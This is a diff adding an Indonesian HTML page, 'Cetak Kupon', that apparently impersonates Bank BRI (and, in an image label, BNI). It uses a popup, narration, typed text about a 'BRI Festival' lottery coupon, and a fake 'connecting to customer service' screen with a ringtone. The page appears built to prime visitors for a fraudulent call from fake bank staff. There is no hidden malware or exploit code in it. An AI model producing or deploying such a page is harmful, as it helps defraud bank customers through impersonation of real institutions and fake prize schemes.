@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#0F78CB">
+  <meta name="description" content=".">
+  <title>Cetak Kupon</title>
+  <link rel="icon" type="image/png" href="">
+  <link rel="image_src" href="">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+
+    #main-content {
+      position: relative;
+      z-index: 1;
+    }
+
+    header {
+      background-color: #0F78CB;
+      padding: 10px 40px;
+      border-bottom: 1px solid #ddd;
+    }
+
+    header img.logo {
+      height: 50px;
+    }
+
+    .hero {
+      background-color: #0F78CB;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0px 1px;
+    }
+
+    .hero img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+
+    .content {
+      text-align: center;
+      padding: 30px 15px;
+    }
+
+    .content-box {
+      background-color: #0F78CB;
+      color: white;
+      padding: 40px;
+      border-radius: 10px;
+      border: 4px solid #fff;
+      max-width: 700px;
+      margin: 0 auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      font-size: 18px;
+      min-height: 100px;
+      line-height: 1.6;
+    }
+
+    footer {
+      background-color: ;
+      height: 100px;
+      margin-top: 30px;
+    }
+
+    #popup-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      cursor: pointer;
+      transition: opacity 0.4s ease;
+    }
+
+    #popup-overlay img {
+      max-width: 50%;
+      height: auto;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+    }
+
+    #calling-popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+    }
+
+    .popup-content {
+      background-color: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .dot {
+      animation: blink 1.2s infinite;
+      margin-left: 5px;
+    }
+
+    @keyframes blink {
+      0% { opacity: 0; }
+      50% { opacity: 1; }
+      100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="main-content">
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwzhsQd1K7iF1d2s06-jdlmwaZV6_bR1eZiRCjx7LnbIHag5c5iAEOVfgP9UE-lQqv0M2-C7gQ3u6y6C-0E1iLZASRfrNtk7YOeBa_5obrbvmB4yi2MOjPPseRovva7VTIMmt3dXKcdlSDiqBt5-D_T5W1RiloJ5AOct6wnyv4SZI6Cj6Ahfc2j_x3NZA/s1080/1703668668502.png" style="width: 100%; position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto">
+    </header>
+
+    <section class="hero">
+      <img src="https://raw.githubusercontent.com/Anjengmanoh/Linakakkafoto/refs/heads/main/1761282591652.jpg" alt="RTanjongBobok">
+    </section>
+
+    <section class="content">
+      <div class="content-box" id="text-box"></div>
+    </section>
+
+    <footer></footer>
+  </div>
+
+  <div id="popup-overlay" onclick="closeInitialPopup()">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjJxzz3Y0-j44_1t7T7gMMYNDlhJlhN2S4GeNYP_Tz3h12yXsdNVo2I8MZyUW2lK5NQOdmpq8sAP9n9CqMLOibLmJlilU5ddTJ9EX4qkZEtwiMjegVtlB6wMzYvHE3d-gbjjIy56U5gasd7QeMnFbxTFvqeOqECwHjefGSYmQV6Ass7PnvE2TYvppr1HCY/s1080/AddText_06-25-07.30.56.jpg" alt="Popup Awal BNI">
+  </div>
+
+  <div id="calling-popup">
+    <div class="popup-content">Sedang di hubungkan ke CS<span class="dot">...</span>
+    </div>
+  </div>
+
+  <audio id="narration" src="b.mp3"></audio>
+  <audio id="ringtone" src="cal.mp3" loop></audio>
+
+  <script>
+    const textBox = document.getElementById("text-box");
+    const narration = document.getElementById("narration");
+    const ringtone = document.getElementById("ringtone");
+    const callingPopup = document.getElementById("calling-popup");
+    const popupOverlay = document.getElementById("popup-overlay");
+
+    const scriptText = `Terimakasih Telah Mendaftar Dilayanan BRI Festival, Pendaftaran Anda Sedang Diproses, Sesaat Lagi Anda Akan Dihubungi Oleh Pihak Bank BRI, Untuk Proses Cetak Kode Kupon Undian Anda`;
+
+    function typeTextPerChar(text, duration, callback) {
+      const totalChars = text.length;
+      const interval = duration / totalChars * 1000; // ms per karakter
+      let index = 0;
+
+      function type() {
+        if (index < totalChars) {
+          textBox.innerHTML += text[index];
+          index++;
+          setTimeout(type, interval);
+        } else {
+          callback?.();
+        }
+      }
+
+      type();
+    }
+
+    function closeInitialPopup() {
+      popupOverlay.style.opacity = "0";
+
+      // Biarkan browser load dan izinkan ringtone setelah klik
+      ringtone.load();
+
+      setTimeout(() => {
+        popupOverlay.style.display = "none";
+        narration.play();
+
+        if (narration.readyState >= 1) {
+          startTyping();
+        } else {
+          narration.onloadedmetadata = startTyping;
+        }
+
+        narration.onended = () => {
+          callingPopup.style.display = "flex";
+          ringtone.play().catch(err => {
+            console.warn("Autoplay ringtone diblokir:", err);
+          });
+        };
+      }, 400);
+    }
+
+    function startTyping() {
+      const durasi = narration.duration || 20;
+      typeTextPerChar(scriptText, durasi, () => {
+        console.log("Selesai mengetik");
+      });
+    }
+  </script>
+
+</body>
+</html>
